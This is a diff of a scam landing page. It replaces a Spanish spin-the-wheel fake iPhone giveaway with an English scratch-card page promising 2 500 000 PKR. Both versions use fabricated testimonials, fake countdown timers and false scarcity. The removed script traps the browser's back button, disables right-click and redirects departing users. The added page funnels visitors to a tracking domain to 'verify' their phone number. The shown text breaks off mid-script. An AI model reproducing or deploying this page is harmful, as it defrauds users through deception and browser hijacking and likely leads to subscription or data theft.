@@ -1,60 +1,322 @@
-<html lang="es"><head>  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/> <meta content="noindex, nofollow, noarchive" name="robots"/> <meta content="no-referrer" name="referrer"/> <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/> <link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEG0lEQVQ4EQEQBO/7AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/7+0IA5eWVAPX1HQDHxwYAAAAAADo6+gAKCuMAFxdpAQkJwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/yMhY/9HR8P9DQ///zs7///z8////////ICD//w4O///U1PH/w8NVAAAAAAT/pAD/AAAAAAAAAAAAAAAAABZBAAAG/QAALy8AAEVFAADMzAAAAQEAADAwAAAAAAAA8vIAACwsDgDU1Jz/9/fqAP+kAP//pAD//6QA//+kAP//173//wsL//8AAP//AAD//wAA//+oqP///////yAg//8AAP//AAD//w8P///f39YCAAAAAAAAAAAAAAAAABIzAAD8DwAA9fUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8fEAAPj4HwIAAAAAAAAAAAAAAAAAEjMAAMnNAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxsYFAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAO7MAAA4NAAAAAAAAAAAAAAfHwAAZGQAACIiAAAAAAAAV1cAAE5OAAAAAAAAAAAAADo6+wD/pAD//6QA//+kAP//pAD//9e9//8ODv//AAD//1BQ////////////////////////yMj//wAA//8REf//3t7WAf+kAP8AAAAAAAAAAAAAAAAAFT4AABiKAAAvOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANbW8wAhIUoCAAAAAAAAAAAAAAAAAAAAAADrwgAA3XkAANHIAAAPDwAAAAAAAAAAAAAAAAAAAAAAABERAADTywAA6OhhAQkJxAH/pAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAFT0AABx+AAABFAAAx8sAAAAAAAA5NQAA/+sAAOOAAAFIxgEAAAAAAf+kAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEwAAATNQAAAAAAAO3LAADv0AAAAAAAAVwAAQAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA79AAAO/QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVtcrx7EHPYAAAAABJRU5ErkJggg==" id="favicon" rel="icon" sizes="16x16" type="image/png"/> <title>Felicidades!</title> <meta content="notranslate" name="google"/> <script>
-function getURLParameter(c) { c = c.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]"); var b = new RegExp("[\\?&]" + c + "=([^&#]*)").exec(location.search); return null === b ? "" : decodeURIComponent(b[1].replace(/\+/g, " ")) }
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Congratulation!</title>
 
-function dateOffset(f, b) { var c = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
-        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
-    1 == c && (f = 0); var d = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"],
-        g = ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"]; return null != !b && 0 != !b && void 0 != !b ? h.getDate() + " de " + g[h.getMonth()] : "day_name_only" == b && c ? d[h.getDay()].toLowerCase() : "top_date" == b && c ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear() : void 0 }! function() { var a; try { for (a = 0; 10 > a; ++a) { history.pushState({}, "", "#") } onpopstate = function(b) { b.state && location.replace("#") } } catch (a) {} }();
+        <link rel="stylesheet" href="css/main.min.css" />
+        <script defer src="js/app.min.js"></script>
+    </head>
+    <body>
+        <header class="header">
+            <img src="img/menu.png" alt="menu icon" aria-hidden="true" width="18" height="18" />
+            <h3>loyalty program</h3>
+            <img src="img/mail.png" alt="mail icon" arai-hidden="true" width="20" height="18" />
+        </header>
+        <main class="main">
+            <div class="main__container">
+                <div class="intro">
+                    <!-- <div class="intro__logo"><img src="img/zongnew.png" alt="logo" /></div> -->
+                    <span class="intro__date" data-date></span>
+                    <span class="intro__congrat">congratulations!</span>
+                    <span class="intro__desc">Today you are lucky!</span>
+                    <span class="intro__desc">Every <span data-today></span> we select 7 users to give them the opportunity to win prizes from our sponsors. You have one try to find 1 of 4 cash prizes. Scratch and win!</span>
+                </div>
+                <div class="scratch">
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                    <div class="scratch__card">
+                        <img class="scratch__field" src="img/scratch-gray.png" alt="Scratch sign" />
+                        <picture>
+                            <source srcset="img/box.png" type="image/webp" />
+                            <img class="box-closed" src="img/box.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-change.webp" type="image/webp" />
+                            <img class="box-opened" src="img/box-change.png" alt="CLosed gift box" loading="lazy" />
+                        </picture>
+                        <picture>
+                            <source srcset="img/box-win.png" type="image/webp" />
+                            <img class="box-win" src="img/box-win.png" alt="Opened gift box" loading="lazy" />
+                        </picture>
+                    </div>
+                </div>
 
+                <section class="gift">
+                    <div class="gift__heading">Congratulations!</div>
+                    <div class="gift__heading"><a href="https://track.track1231225.xyz/click">2 500 000 PKR!</a></div>
+                    <div class="gift__conditions">
+                        <ol>
+                            <li>Choose a color that you would like. You will be redirected to our sponsor's website.</li>
+                            <li>Verify your mobile phone number on the sponsor's website to download your personal voucher and claim your prize.</li>
+                        </ol>
+                        <p class="pt">
+                            <b>IMPORTANT:</b> Gifts can end anytime, choose faster!
+                        </p>
+                    </div>
+                    <div class="gift__timer">
+                        Offer is valid for <span class="gift__timer-red"><span data-minutes>0</span> minutes and <span data-seconds>00</span> seconds</span>
+                    </div>
+                    <div class="gift__cards">
+                        <div class="card">
+                            <a href="https://track.track1231225.xyz/click">
+                                <img class="card__img" src="img/cash.jpg" alt="iPhone 14Pro Gold" loading="lazy" width="" height="" />
+                            </a>
+                            <div class="card__content">
+                                <span class="card__heading"><a href="https://track.track1231225.xyz/click">2 500 000 PKR to bank card</a></span>
+                                <span class="card__desc">You will receive the funds by postal order in an envelope within 7 business days.</span>
+                                <span class="card__info">Retail price: <span class="card__info-red-crossed">2 500 000 PKR</span></span>
+                                <span class="card__info">Your price: <span class="card__info-green">0 PKR</span></span>
+                            </div>
+                            <a href="https://track.track1231225.xyz/click" class="card__link">Choose</a>
+                        </div>
+                        <div class="card">
+                            <a href="https://track.track1231225.xyz/click">
+                                <img class="card__img" src="img/cash2.jpg" alt="iPhone 14Pro Gold" loading="lazy" width="" height="" />
+                            </a>
+                            <div class="card__content">
+                                <span class="card__heading"><a href="https://track.track1231225.xyz/click">2 500 000 PKR to bank card</a></span>
+                                <span class="card__desc">You will receive the funds by postal order in an envelope within 7 business days.</span>
+                                <span class="card__info">Retail price: <span class="card__info-red-crossed">2 500 000 PKR</span></span>
+                                <span class="card__info">Your price: <span class="card__info-green">0 PKR</span></span>
+                            </div>
+                            <a href="https://track.track1231225.xyz/click" class="card__link">Choose</a>
+                        </div>
+                    </div>
+                </section>
 
+                <section class="replies">
+                    <div class="replies__like">
+                        <div class="like-1" aria-hidden="true"></div>
+                        <div class="like-2" aria-hidden="true"></div>
+                        <span> 2319 people like this</span>
+                    </div>
+                    <div class="replies__actions" aria-hidden="true">
+                        <div class="replies__action">
+                            <img src="img/like.png" alt="like" width="20" height="20" />
+                            <span class="replies__action-desc">1537</span>
+                        </div>
+                        <div class="replies__action">
+                            <img src="img/share.png" alt="share" width="20" height="20" />
+                            <span class="replies__action-desc">234</span>
+                        </div>
+                        <div class="replies__action">
+                            <img src="img/views.png" alt="views" width="20" height="20" />
+                            <span class="replies__action-desc">544K</span>
+                        </div>
+                    </div>
+                    <ul class="replies__list" data-replies-list>
+                        <li class="replies__item reply"></li>
 
-</script> <!-- import global backbutton url --> <script src="2d1f57a0dcfab84577a6e56e4dc6d711.static.js"></script> <script>var backbutton_url = backurl();</script> <script async="" src="ccbab93a86a362619ca503ad5f0334c4.static.js"></script> <link href="1b706aee7e33359b6e4194cd9acbb5a1.static.css" rel="stylesheet"/> <script src="608a3ac97bb51cf66c65d0afc9731695.static.js"></script></head> <body oncontextmenu="return!1" onload="setButtonHeight(),autospin1()"> <div id="header"> <span class="menu"></span> <h3><span id="headline">El programa de lealtad</span></h3><span class="icon"></span> </div> <div id="container"> <div align="center" id="firstpage"> <div class="date" id="topDate" style="padding-bottom:10px;margin:0"> <script>document.write(dateOffset(0,"top_date"));</script>Jueves, 15 diciembre 2022 </div> <div style="margin-bottom:2px"> <div id="subheadline"> <p style="font-size:18px"><b>¡Felicidades!</b></p> <p style="padding-top:10px">¡Hoy tienes suerte!</p> </div> <div class="intro" style="padding-top:5px"> Todos los <span id="today"><script>document.write(dateOffset(0,"day_name_only"));</script>jueves</span> seleccionamos 7 usuarios <script>document.write(getURLParameter("brand"));</script>Telstar S.A. para dar la oportunidad de ganar un premio de nuestros patrocinadores. ¡Gira la rueda para ver qué premio recibirás! </div> <div id="wheelCon"> <img class="spinAround2 transparent" height="501" id="wheel" src="fe8cabac9a4fa641e21b7d983eaf8411.static.png" width="501"/> <input id="pressButton" onclick="spin()" style="top: 106.2px;" type="button"/> <!-- <div><img class="animated rotateIn" id="devMockup" src="c0d294cd43e94a7fcb768b867b24af04.static.png" style="display: block; left: 64px; top: 41.5px;"></div> --> </div> </div> <div id="secondpage"> <div class="congrats"> <h4> <a href="https://track.track1231225.xyz/click" onclick="exit_a1();PreventExitPop=false" rel="noreferrer" style="cursor:pointer!important"> <font color="#3C5A96">¡Felicitaciones!<br/>¡Solo tiene que completar los siguientes pasos para recibir su Apple iphone 15 Pro!</font> </a> </h4> </div> <div class="congrats" style="text-align:left"> <ol> <li>Haga clic en el botón seleccionar, frente al color que te gusta. Después de eso, usted será redirigido a la web de nuestro patrocinador</li> <li>En el sitio web del patrocinador, escriba su nombre y la dirección de entrega</li> <li>Tu regalo será enviado por mensajería DHL a la dirección indicada en un plazo de 5 días</li> </ol><b>¡Importante:</b> los Regalos pueden terminar en cualquier momento, haga la elección más rápido! </div> <div class="timer"> Oferta válida otros <font color="red"><b><span id="mins">4</span> minutos y <span id="hsecs">16</span> segundos</b></font> </div> <div class="prize"> <table> <tbody> <tr> <th></th> <td style="padding:10px 5px 10px 0;text-align:center"><img src="659e7386e1cca83cb2a05b1b2ba36bfe.static.png" style="max-width:100px"/></td> <td style="line-height:1.6"> <p style="text-align:left"><a href="https://track.track1231225.xyz/click" onclick="exit_a1();PreventExitPop=false" rel="noreferrer" style="cursor:pointer!important"><span class="name">iphone 15 Pro 512GB (Azul)</span></a></p> <p><span class="smallfont">6.1" Super Retina XDR Display</span></p> <p class="regular_price">Precio normal: <s class="red_text"><script>document.write(getURLParameter("pr"));</script>1.249 USD</s></p> <p class="your_price">El precio: <span><script>document.write(getURLParameter("yp"));</script>0 USD</span></p> <p class="remaining"><b>Queda: <span>1</span></b></p> <div> <a class="button" href="https://track.track1231225.xyz/click" onclick="exit_a1();PreventExitPop=false" rel="noreferrer" style="cursor:pointer!important"> Seleccionar </a> </div> </td> </tr> </tbody> </table> </div> <div class="prize"> <table> <tbody> <tr> <th></th> <td style="padding:10px 5px 10px 0;text-align:center"><img src="b4350a03b09862fd42d5ef9d0f4c1a9e.static.png" style="max-width:100px"/></td> <td style="line-height:1.6"> <p style="text-align:left"><a href="https://track.track1231225.xyz/click" onclick="exit_a1();PreventExitPop=false" rel="noreferrer" style="cursor:pointer!important"><span class="name">iphone 15 Pro 512GB (Gris espacial)</span></a></p> <p><span class="smallfont">6.1" Super Retina XDR Display</span></p> <p class="regular_price">Precio normal: <s class="red_text"><script>document.write(getURLParameter("pr"));</script>1.249 USD</s></p> <p class="your_price">El precio: <span><script>document.write(getURLParameter("yp"));</script>0 USD</span></p> <p class="remaining"><b>Queda: <span>3</span></b></p> <div> <a class="button" href="https://track.track1231225.xyz/click" onclick="exit_a1();PreventExitPop=false" rel="noreferrer" style="cursor:pointer!important"> Seleccionar </a> </div> </td> </tr> </tbody> </table> </div> </div> </div> <div class="container"> <div class="comments"> <div class="wi_like_wrap border_bottom"> <span class="like_people"><span class="like_people_images"><span class="like_people_image_wrap"><img class="like_people_image" height="24" src="67a42476b161666d819ea11ae0175bbf.static.jpg" width="24"/></span> <span class="like_people_image_wrap"><img class="like_people_image" height="24" src="f2adf97e8be6e8bcc4490a1bc5b3b6e2.static.jpg" width="24"/></span></span> <span class="like_people_text">Gusta 1537</span></span> </div> <div class="wi_buttons border_bottom"> <div class="wi_buttons_wrap"> <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">1537</b></span> <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">234</b></span></span> <span class="item_views"><i class="i_views"></i> <b class="v_views">544K</b></span> </div> </div> <center> <font face="arial"></font> <table border="0" cellpadding="4" cellspacing="0" style="padding-top:10px;font-size:13px" width="100%"> <tbody id="comments_list"> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="4c19b0ade94c8f6469c28248cd43b183.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Adhemar Amador</div> <div class="comment_text">Honestamente, yo quería el iMac, pero hoy no ... Bueno, ¿creo que el iphone 15 Pro tampoco es tan malo?</div> <div class="comments__item__meta"> <div class="item_date">Ayer en 08:13 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="c92f7d344b54fd02e0448670f9a6fcee.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Olivo Zambrano</div> <div class="comment_text">Gané 1 vuelta gratis, pero no gané el premio. ¿Puedo tener otra oportunidad? </div> <div class="comments__item__meta"> <div class="item_date"> <script>document.write(dateOffset(2));</script>13 de diciembre a las 16:21 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="16d448c39606309c9f0c116b8dbe73df.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Arteaga Huerta</div> <div class="comment_text">¡Acabo de recibir un nuevo iMac! ¡Este es el mejor regalo! </div> <div class="comments__item__meta"> <div class="item_date"> <script>document.write(dateOffset(2));</script>13 de diciembre a las 15:33 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="33917eb8b36d02867988320f1f288c2d.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Athina Velasco</div> <div class="comment_text">¡Al principio pensé que era una broma, pero de hecho me entregaron un nuevo iphone esta mañana! </div> <div class="comments__item__meta"> <div class="item_date"> <script>document.write(dateOffset(2));</script>13 de diciembre a las 09:02 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="a4c54fc68128d7961105795be4394613.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Daiana Agosto</div> <div class="comment_text">Mi iMac ha llegado hoy por la mañana! Estoy feliz!!!! </div> <div class="comments__item__meta"> <div class="item_date"> <script>document.write(dateOffset(3));</script>12 de diciembre a las 11:01 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="41c34df66adbfa3142e6dcbef4135081.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Fucsia Najera Saenz</div> <div class="comment_text">Estaba muy feliz de ganar el iPad Pro. ¡Todavía no creo que esto sea cierto! </div> <div class="comments__item__meta"> <div class="item_date"> <script>document.write(dateOffset(3));</script>12 de diciembre a las 5:45 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> <tr> <td align="right" class="photo_avatar" valign="top" width="40"><img src="f8a05d08a710d52c4950e11ef502974a.static.jpg"/></td> <td align="left" valign="top"> <div class="comment_name">Abram Armijo</div> <div class="comment_text">Gané el ipad, pero ya lo tengo. ¿Puedo obtener un iMac a cambio? </div> <div class="comments__item__meta"> <div class="item_date"> <script>document.write(dateOffset(4));</script>11 de diciembre a las 16:47 </div> </div> <div class="pi_links"> <span class="like_wrap"><span class="pi_link">Me gusta</span></span> <span class="pi_reply_wrap">· <span>Comentar</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div> </td> </tr> <tr> <td colspan="2"> <hr/> </td> </tr> </tbody> </table> <div class="show_next_wrap"> <span class="show_next">Ver comentarios siguiente</span> </div> </center> </div> </div> <div class="fixed_footer"><img alt="" class="clip" src="7ee0bc1da98f6fc0ed35099be2d0316c.static.png"/> <input class="footer_input" placeholder="Su mensaje" type="text"/> <img alt="" class="btn_send" src="0f06bc6c324f4807a7a82f80389d659d.static.png"/></div> </div> <script type="text/javascript">
-var page = getURLParameter("page"),
-    brand = getURLParameter("device_brand");
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/1.jpeg" alt="Silas Kumar avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Silas Kumar</span>
+                                <span class="reply__desc" data-reply-desc>Dropped 5 000 000 PKR! Honestly, I wanted 25 000 000 PKR, but not today ...</span>
+                                <span class="reply__createdAt" data-reply-createdAt>20 minutes ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
 
-function exit_a1() { window.onbeforeunload = null, window.location = "https://" + getURLParameter("td") + "/click.php?lp=1" }
-var conMid, mydate = new Date,
-    year = mydate.getFullYear(),
-    month = mydate.getMonth(),
-    day = mydate.getDate(),
-    weekday = mydate.getDay(),
-    count = 1,
-    headline = document.getElementById("headline"),
-    topDate = document.getElementById("topDate"),
-    today = document.getElementById("today"),
-    con = document.getElementById("container"),
-    whCon = document.getElementById("wheelCon"),
-    dWheel = document.getElementById("wheel"),
-    button = document.getElementById("pressButton"),
-    device = document.getElementById("devMockup"),
-    first = document.getElementById("firstpage"),
-    second = document.getElementById("secondpage");
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/2.jpeg" alt="Jonah Al Habsi avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Jonah Al Habsi</span>
+                                <span class="reply__desc" data-reply-desc>I found a second chance, but then didn't win the prize. Can I get another chance?</span>
+                                <span class="reply__createdAt" data-reply-createdAt>40 minutes ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
 
-function setButtonHeight() { conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px" }
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/3.jpeg" alt="Vihaan Kannan avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Vihaan Kannan</span>
+                                <span class="reply__desc" data-reply-desc>I just unpacked the envelope with 2 500 000 PKR! This is the best prize of all!</span>
+                                <span class="reply__createdAt" data-reply-createdAt>hour ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
 
-function spin() { switch (count) {
-        case 1:
-            button.disabled = !0, dWheel.className = "spinAround", setTimeout(function() { button.disabled = !1, alert("¡Tienes una oportunidad más!\n\n¡Intenta de nuevo!"), autospin2() }, 6800); break;
-        case 2:
-            dWheel.className = "spinAround2", setTimeout(function() { dWheel.className = dWheel.className + " transparent" }, 6800), setTimeout(function() { device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px" }, 7000), setTimeout(function() { first.innerHTML = "<img src='loading.gif'>", first.style.padding = "195px 0px", setTimeout(function() { first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000) }, 1500) }, 9000) } count++ }
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/4.jpg" alt="Mariam Saeed avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Mariam Saeed</span>
+                                <span class="reply__desc" data-reply-desc>At first I thought it was a joke, but this morning I was delivered 10 000 000 PKR, I also got a T-shirt with a logo!</span>
+                                <span class="reply__createdAt" data-reply-createdAt>more then hour ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
 
-function autospin2() { spin() }
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/5.jpeg" alt="Fatima Khan avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Fatima Khan</span>
+                                <span class="reply__desc" data-reply-desc>My 5,000,000 PKR arrived on the card this morning!! I love it!!!</span>
+                                <span class="reply__createdAt" data-reply-createdAt>two hours ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
 
-function autospin1() { alert("¡Enhorabuena, un usuario de " + getURLParameter("brand") + "!\n\n¡Usted es uno de los 7 personas seleccionadas para participar en el programa de fidelización de " + getURLParameter("brand") + "! ¡Tienes la oportunidad de conseguir 1 de las 4 de regalos!\n\n¡Haga clic en el botón OK para empezar!"), document.getElementById("pressButton").click() }
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/6.jpg" alt="Liya Pillai avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Liya Pillai</span>
+                                <span class="reply__desc" data-reply-desc>I won 2 500 000 PKR. I still do not believe that this is true!</span>
+                                <span class="reply__createdAt" data-reply-createdAt>three hours ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
+                        <li class="replies__item reply">
+                            <div class="reply__img">
+                                <img src="img/replies/7.jpg" alt="Liya Pillai avatar" width="40" height="40" />
+                            </div>
+                            <div class="reply__content">
+                                <span class="reply__author" data-reply-author>Shajid Ahamed</span>
+                                <span class="reply__desc" data-reply-desc>I won 1 000 000 PKR, thank you so much!!</span>
+                                <span class="reply__createdAt" data-reply-createdAt>more then 6 hours ago</span>
+                                <span class="reply__actions">Like · Comment</span>
+                            </div>
+                        </li>
+                    </ul>
+                    <span class="replies__all">See All</span>
+                </section>
+            </div>
+        </main>
+        <script>
 
-function countdown() { var b = parseInt(document.getElementById("mins").innerHTML),
-        a = parseInt(document.getElementById("hsecs").innerHTML),
-        d = 0,
-        c = 0;
-    0 !== b && 0 === a ? (d = b - 1, c = 59) : 0 !== b || 0 !== a ? (d = b, c = a - 1) : 0 === b && 0 === a && (d = b, c = a), c < 10 && (c = "0" + c), document.getElementById("mins").textContent = d, document.getElementById("hsecs").textContent = c };
-</script> <script type="text/javascript">
-! function () {
-var t;
-try {
